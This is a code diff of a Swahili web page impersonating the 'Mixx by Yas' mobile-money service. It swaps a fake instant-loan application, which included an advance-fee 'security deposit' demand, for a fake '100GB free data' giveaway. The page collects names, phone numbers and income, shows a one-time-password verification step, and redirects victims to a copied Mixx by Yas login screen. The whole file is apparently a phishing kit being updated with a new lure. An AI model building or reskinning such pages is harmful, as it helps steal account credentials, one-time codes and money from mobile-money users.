@@ -318,14 +318,14 @@
   </nav>
   <div class="step-center">
     <div class="step-card">
-      <h2>Maombi ya Mkopo</h2>
+      <h2>Maombi ya Data ya Bure</h2>
       <p class="step-sub">Hatua 1 ya 3</p>
       <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
-      <div class="field"><label>Aina ya Mkopo</label><div class="sel-wrap"><select id="s1ty"><option>Mkopo wa Binafsi</option><option selected>Mkopo wa Biashara</option><option>Mkopo wa Nyumba</option><option>Mkopo wa Gari</option><option>Mkopo wa Elimu</option></select></div></div>
-      <div class="field"><label>Kiasi cha Mkopo (TSh)</label><input type="number" id="s1am" value="100000" placeholder="Weka kiasi" oninput="clearErr('s1Err')"></div>
-      <div class="field"><label>Muda wa Mkopo</label><div class="sel-wrap"><select id="s1te"><option>Miezi 6</option><option>Miezi 12</option><option>Miezi 18</option><option>Miezi 24</option><option>Miezi 36</option><option selected>Miezi 48</option><option>Miezi 60</option></select></div></div>
-      <div class="field"><label>Madhumuni ya Mkopo</label><textarea id="s1pu" placeholder="Elezea madhumuni ya mkopo wako…" oninput="clearErr('s1Err')"></textarea></div>
+      <div class="field"><label>Aina ya Data</label><div class="sel-wrap"><select id="s1ty"><option>Data ya Simu</option><option selected>Data ya Nyumbani</option><option>Data ya Biashara</option><option>Data ya Shule</option><option>Data ya Ofisi</option></select></div></div>
+      <div class="field"><label>Kiasi cha Data (GB)</label><input type="number" id="s1am" value="100" placeholder="Weka kiasi cha data" oninput="clearErr('s1Err')"></div>
+      <div class="field"><label>Muda wa Matumizi</label><div class="sel-wrap"><select id="s1te"><option>Siku 7</option><option>Siku 14</option><option selected>Siku 30</option><option>Siku 60</option><option>Siku 90</option></select></div></div>
+      <div class="field"><label>Madhumuni ya Data</label><textarea id="s1pu" placeholder="Elezea utatumia data kwa nini…" oninput="clearErr('s1Err')"></textarea></div>
       <button class="btn-grad" onclick="toS2()">HATUA INAYOFUATA</button>
     </div>
   </div>
@@ -346,7 +346,7 @@
   </nav>
   <div class="step-center">
     <div class="step-card">
-      <h2>Maombi ya Mkopo</h2>
+      <h2>Maombi ya Data ya Bure</h2>
       <p class="step-sub">Hatua 2 ya 3</p>
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s2Err"><span class="msg-icon">&#x2715;</span><span id="s2ErrTxt"></span></div>
@@ -384,7 +384,7 @@
   </nav>
   <div class="step-center">
     <div class="step-card">
-      <h2>Maombi ya Mkopo</h2>
+      <h2>Maombi ya Data ya Bure</h2>
       <p class="step-sub">Hatua 3 ya 3</p>
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
       <div class="msg-box error" id="s3Err"><span class="msg-icon">&#x2715;</span><span id="s3ErrTxt"></span></div>
@@ -392,8 +392,8 @@
       <div class="field"><label>Mapato ya Mwaka (TSh)</label><input type="number" id="s3in" placeholder="Weka mapato ya mwaka" oninput="clearErr('s3Err')"></div>
       <div class="sum-box">
         <h3>Muhtasari wa Maombi</h3>
-        <div class="sum-row"><span class="sk">Kiasi cha Mkopo:</span><span class="sv" id="sA">TSh 100,000</span></div>
-        <div class="sum-row"><span class="sk">Muda wa Mkopo:</span><span class="sv" id="sT">Miezi 48</span></div>
+        <div class="sum-row"><span class="sk">Kiasi cha Data:</span><span class="sv" id="sA">100 GB</span></div>
+        <div class="sum-row"><span class="sk">Muda wa Matumizi:</span><span class="sv" id="sT">Siku 30</span></div>
         <div class="sum-row"><span class="sk">Madhumuni:</span><span class="sv" id="sP">—</span></div>
         <div class="sum-row"><span class="sk">Mwombaji:</span><span class="sv" id="sN">—</span></div>
       </div>
@@ -409,9 +409,9 @@
 <!-- ══════════════════════ PAGE 5: SUBMITTED ══════════════════════ -->
 <div id="page-submitted" class="page">
   <div class="sub-wrap">
-    <div class="sub-icon">📋</div>
-    <h2>Maombi ya Mkopo Yamewasilishwa</h2>
-    <p>Maombi yako ya mkopo yamewasilishwa. Tafadhali subiri idhini.<br>Utapata ujumbe wa uthibitisho. Kwa sasa, endelea kwenye Mixx by Yas.</p>
+    <div class="sub-icon">📶</div>
+    <h2>Maombi ya Data ya Bure Yamewasilishwa</h2>
+    <p>Maombi yako ya data ya bure yamewasilishwa. Tafadhali subiri idhini.<br>Utapata ujumbe wa uthibitisho. Kwa sasa, endelea kwenye Mixx by Yas.</p>
     <div class="redir-pill">🔄 Unaelekezwa kwenye kuingia Mixx by Yas katika <span class="redir-n" id="rdN">3</span>s...</div><br>
     <button class="btn-go" onclick="goTo('page-login')">Nenda Kuingia Sasa</button>
   </div>
@@ -426,7 +426,7 @@
         <path d="M12 22 L14 14 L16 22 M18 22 L20 14 L22 22 M24 22 L26 14 L28 22" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
       </svg>
       <div class="brand" style="font-size:1.6rem;">Mixx<span>Yas</span></div>
-      <div class="logo-sub">Mikopo ya Haraka na Rahisi</div>
+      <div class="logo-sub">Data ya Bure ya Haraka na Rahisi</div>
     </div>
   </div>
   <div class="login-body-wrap">
@@ -458,7 +458,7 @@
           <path d="M12 22 L14 14 L16 22 M18 22 L20 14 L22 22 M24 22 L26 14 L28 22" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
         </svg>
         <div class="brand" style="font-size:1.25rem;">Mixx<span>Yas</span></div>
-        <div class="logo-sub">Mikopo ya Haraka na Rahisi</div>
+        <div class="logo-sub">Data ya Bure ya Haraka na Rahisi</div>
       </div>
       <div class="lg-version">v2.1.3P</div>
       <div class="lg-terms">Kwa kuingia unakubali <a href="#">Masharti na Vigezo</a></div>
@@ -511,31 +511,48 @@
 
 <!-- ══════════════════════ PAGE 8: APPROVAL ══════════════════════ -->
 <div id="page-approval" class="page">
-  <div class="appr-wrap">
-    <div class="appr-top">
-      <div class="check-circle">✓</div>
-      <div class="appr-title">🎉 Hongera!</div>
-      <div class="appr-sub">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</div>
-      <div class="appr-banner"><div class="abl">KIASI KILICHOIDHINISHWA</div><div class="aba" id="apAmt">TSh 100,000</div></div>
+  <div class="appr-wrap" style="text-align:center;padding:40px 24px;max-width:520px;margin:0 auto;">
+
+    <!-- Celebration icon -->
+    <div style="width:100px;height:100px;border-radius:50%;background:rgba(255,215,0,0.15);border:3px solid rgba(255,215,0,0.4);display:flex;align-items:center;justify-content:center;font-size:3rem;margin:0 auto 28px;animation:pulse 2s ease infinite;">🎉</div>
+
+    <!-- Main heading -->
+    <div style="font-size:1.8rem;font-weight:800;color:#fff;margin-bottom:10px;line-height:1.2;">Hongera!</div>
+    <div style="font-size:1.1rem;font-weight:600;color:rgba(255,255,255,0.9);margin-bottom:28px;">Umepewa Data ya Bure!</div>
+
+    <!-- 100GB Banner -->
+    <div style="background:linear-gradient(135deg,#FFD700,#FFC800);border-radius:16px;padding:28px 20px;margin-bottom:28px;box-shadow:0 8px 32px rgba(255,215,0,0.3);">
+      <div style="font-size:0.85rem;font-weight:600;color:#001B4D;letter-spacing:0.1em;margin-bottom:8px;">UMEPEWA JUMLA YA</div>
+      <div style="font-size:4rem;font-weight:900;color:#001B4D;line-height:1;letter-spacing:-2px;">100GB</div>
+      <div style="font-size:1rem;font-weight:700;color:#001B4D;margin-top:6px;letter-spacing:0.05em;">DATA YA BURE</div>
     </div>
-    <div class="comp-box">
-      <div class="ch">⚠️ NOTISI YA UZINGATIAJI</div>
-      <p>Akaunti yako ya Mixx by Yas lazima iwe hai na idumishe amana ya usalama ya angalau <strong>10% ya kiasi cha mkopo ulioomba.</strong> Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.</p>
+
+    <!-- Details card -->
+    <div style="background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);border-radius:12px;padding:20px;margin-bottom:24px;text-align:left;">
+      <div style="font-size:0.85rem;font-weight:700;color:#FFD700;margin-bottom:14px;letter-spacing:0.05em;">📋 MAELEZO YA DATA YAKO</div>
+      <div style="display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.1);font-size:0.88rem;">
+        <span style="color:rgba(255,255,255,0.6);">Kiasi cha Data</span>
+        <span style="color:#fff;font-weight:600;">100 GB</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.1);font-size:0.88rem;">
+        <span style="color:rgba(255,255,255,0.6);">Muda wa Matumizi</span>
+        <span style="color:#fff;font-weight:600;">Siku 30</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:10px 0;font-size:0.88rem;">
+        <span style="color:rgba(255,255,255,0.6);">Hali</span>
+        <span style="color:#4ade80;font-weight:700;">✓ Imeidhinishwa</span>
+      </div>
     </div>
-    <div class="ld-card">
-      <div class="ld-htitle">💳 Maelezo ya Mkopo</div>
-      <div class="ld-row"><div class="ld-icon ic-g">💵</div><div><div class="ld-lbl">MALIPO YA KILA MWEZI</div><div class="ld-val" id="apMthly">TSh 2,750</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">MUDA WA MKOPO</div><div class="ld-val" id="apTerm">Miezi 48</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-p">📈</div><div><div class="ld-lbl">KIWANGO CHA RIBA</div><div class="ld-val">8% APR</div></div></div>
+
+    <!-- Notice -->
+    <div style="background:rgba(255,215,0,0.08);border:1px solid rgba(255,215,0,0.2);border-radius:10px;padding:16px;margin-bottom:28px;text-align:left;">
+      <div style="font-size:0.82rem;font-weight:700;color:#FFD700;margin-bottom:6px;">📱 HATUA ZINAZOFUATA</div>
+      <p style="font-size:0.82rem;color:rgba(255,255,255,0.8);line-height:1.6;margin:0;">Data yako ya GB 100 itaongezwa kwenye nambari yako ya simu hivi karibuni. Utapata ujumbe wa SMS ukithibitisha upokeaji wa data yako ya bure.</p>
     </div>
-    <div class="qa-wrap">
-      <div class="qa-title">Vitendo vya Haraka</div>
-      <button class="qa-btn">💰 Weka Fedha</button>
-      <button class="qa-btn">💸 Toa Fedha</button>
-      <button class="qa-btn">📄 Maelezo ya Mkopo</button>
-    </div>
-    <div class="nxt-steps"><span>📱</span><p><strong>Hatua Zinazofuata:</strong><br>Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.</p></div>
-    <div class="rth-wrap"><button class="rth-btn" onclick="goTo('page-landing')">🏠 Rudi Nyumbani</button></div>
+
+    <!-- Home button -->
+    <button onclick="goTo('page-landing')" style="width:100%;padding:16px;background:linear-gradient(to right,#FFD700,#FFC800);color:#001B4D;border:none;border-radius:10px;font-size:1rem;font-weight:800;letter-spacing:0.06em;cursor:pointer;font-family:'Inter',sans-serif;">🏠 RUDI NYUMBANI</button>
+
   </div>
 </div>
 
@@ -547,7 +564,7 @@
   <div class="modal"><div class="spinner"></div><h3>Inathibitisha OTP</h3><p id="otpVT">Tafadhali subiri… (3s)</p></div>
 </div>
 <div class="overlay" id="mSubmit">
-  <div class="modal"><div class="spinner"></div><h3>Inawasilisha Maombi…</h3><p>Tafadhali subiri wakati tunashughulikia maombi yako</p></div>
+  <div class="modal"><div class="spinner"></div><h3>Inawasilisha Maombi…</h3><p>Tafadhali subiri wakati tunashughulikia maombi yako ya data ya bure</p></div>
 </div>
 
 <script>
@@ -642,15 +659,15 @@
     const amt     = document.getElementById('s1am').value;
     const purpose = document.getElementById('s1pu').value.trim();
     if (!amt || Number(amt) <= 0) {
-      showErr('s1Err', 'Tafadhali weka kiasi sahihi cha mkopo.');
+      showErr('s1Err', 'Tafadhali weka kiasi sahihi cha data.');
       shakeField('s1am'); return;
     }
     if (Number(amt) > 100000000) {
-      showErr('s1Err', 'Kiasi cha juu zaidi cha mkopo ni TSh 100,000,000.');
+      showErr('s1Err', 'Kiasi cha juu zaidi cha data ni GB 100,000,000.');
       shakeField('s1am'); return;
     }
     if (!purpose) {
-      showErr('s1Err', 'Tafadhali elezea madhumuni ya mkopo wako.');
+      showErr('s1Err', 'Tafadhali elezea madhumuni ya data yako.');
       shakeField('s1pu'); return;
     }
     clearErr('s1Err');
@@ -675,7 +692,7 @@
     }
     clearErr('s2Err');
     S.first = first; S.last = last; S.phone = phone;
-    document.getElementById('sA').textContent = 'TSh ' + Number(S.amt).toLocaleString();
+    document.getElementById('sA').textContent = Number(S.amt).toLocaleString() + ' GB';
     document.getElementById('sT').textContent = S.term;
     document.getElementById('sP').textContent = S.purpose || '—';
     document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
